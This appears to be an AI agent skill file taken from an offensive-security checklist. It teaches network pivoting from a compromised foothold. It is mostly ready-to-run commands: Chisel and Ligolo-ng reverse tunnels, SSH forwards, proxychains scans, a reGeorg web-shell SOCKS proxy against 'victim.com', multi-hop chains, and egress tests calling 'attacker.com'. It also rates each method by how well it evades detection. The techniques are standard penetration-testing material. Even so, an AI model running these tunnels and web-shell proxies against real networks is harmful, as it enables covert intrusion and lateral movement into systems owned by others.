---
name: offensive-network-pivoting
description: "Network pivoting and tunneling — Chisel reverse SOCKS, Ligolo-ng tun-based pivoting, sshuttle for port-forward over SSH, ssh -D / -L / -R local port forwards, proxychains routing, RDP-based pivots, web shells with reverse SOCKS, and bring-your-own-tunneling-binary considerations. Use to reach internal segments from a foothold without dedicated VPN access."
---

# Network Pivoting

You have a foothold in segment A; you need to reach hosts in segment B that aren't directly routable. Pivoting tunnels your traffic through the foothold.

## Tooling Comparison

| Tool | Mechanism | Best For |
|---|---|---|
| Chisel | Reverse SOCKS over HTTP/WebSocket | Easy setup, firewall-friendly |
| Ligolo-ng | TUN interface + reverse | Best UX (real network interface) |
| sshuttle | SSH-based VPN | When SSH is available |
| ssh -D | SOCKS over SSH | Quick one-liner |
| Metasploit `route` + `socks_proxy` | Built-in MSF pivot | Within MSF workflow |
| reGeorg | Web-shell-based SOCKS | When only HTTP egress |
| OpenVPN tunnel | Full VPN | When you can install drivers |

## Chisel (Recommended Default)

```bash
# Attacker side (publicly reachable)
chisel server -p 8080 --reverse

# Pivot host side
chisel client attacker:8080 R:1080:socks
# Reverse SOCKS proxy on attacker:1080

# Use via proxychains
proxychains nmap -sT -Pn -p 80,443 10.0.0.0/24
```

Chisel works over plain HTTP — great for restrictive egress policies that allow only HTTP/HTTPS outbound.

## Ligolo-ng (Best UX)

```bash
# Attacker side
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ligolo-ng -selfcert

# Pivot side
ligolo-agent -connect attacker:11601 -ignore-cert

# Attacker — add routes
sudo ip route add 10.0.0.0/24 dev ligolo
session
> tunnel_start
```

Now your routing table includes the internal network — every tool works natively, no proxychains.

## sshuttle (When SSH Available)

```bash
sshuttle -r user@pivot 10.0.0.0/24
# Routes 10.0.0.0/24 through pivot via SSH

# All traffic to that range tunnels transparently
```

## ssh Forwards

```bash
# Local forward — accept locally, forward to remote
ssh -L 8080:internal-target:80 user@pivot

# Remote forward — listen on remote, forward to local
ssh -R 4444:localhost:4444 user@pivot

# Dynamic forward — SOCKS5 on local
ssh -D 1080 user@pivot
```

Combine with `~/.ssh/config` for persistence:

```
Host pivot
  HostName 10.10.10.5
  User user
  DynamicForward 1080
  LocalForward 8080 internal:80
```

## proxychains

```ini
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn 10.0.0.10
proxychains curl http://internal-app
proxychains psql -h db.internal -U postgres
```

`-sT` (TCP connect, no raw sockets) is required for nmap through SOCKS — `-sS` doesn't work over proxy.

## RDP Pivot (When Foothold Is Windows)

```cmd
:: Forward RDP via SSH from Windows side
ssh -L 3389:internal:3389 user@attacker

:: Or use mstsc gateway feature with custom RDS gateway
```

```powershell
# Plink.exe (PuTTY) for non-SSH-native Windows
plink.exe -ssh -D 1080 user@attacker
```

## Web Shell SOCKS (reGeorg / Tunna / pivotnacci)

When the only foothold is a web shell:

```bash
# Upload reGeorg PHP/JSP/ASPX shell
# Then connect from attacker
python reGeorgSocksProxy.py -p 1080 -u "https://victim.com/upload/tunnel.php"

# proxychains for everything
```

Slow but invisible to network-based detection (looks like normal HTTP traffic to the web app).

## Multi-Hop

```
Attacker → Pivot1 (DMZ) → Pivot2 (intranet) → Target

# Chain Chisel:
# Attacker:8080 listens
# Pivot1: chisel client attacker:8080 R:1081:socks
# Pivot2: chisel client pivot1:1081 R:1082:socks
# (or using SSH -D nested)
```

## Detection

| Tool | Detection Risk |
|---|---|
| Chisel over HTTP | Very low (looks like web traffic) |
| Ligolo TUN | Custom interface visible in netstat |
| sshuttle | SSH connections; TCP reset on tunnel close |
| Web shell SOCKS | Only HTTP traffic visible |
| Plain SSH -D | SSH outbound traffic |

Egress filtering (port-restrict, DNS-only, application-layer) limits options. Test your egress before relying on a method.

## Engagement Cheatsheet

```bash
# 1. Test egress from foothold
curl -v http://attacker.com/         # HTTP/HTTPS
nc -zv attacker.com 22                # SSH
ping attacker.com                     # ICMP (often blocked)

# 2. Pick tool based on egress
# - HTTP only: Chisel
# - SSH out: ssh -D / sshuttle / ligolo
# - Application-only: web shell tunnel

# 3. Establish pivot
# 4. Add internal routes / configure proxychains
# 5. Test reachability: nmap a known internal host
# 6. Run target tooling through pivot
```

## Key References

- Chisel: github.com/jpillora/chisel
- Ligolo-ng: github.com/nicocha30/ligolo-ng
- sshuttle: github.com/sshuttle/sshuttle
- "Pivoting Like a Pro" (various BB writeups)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/network-pivoting.md
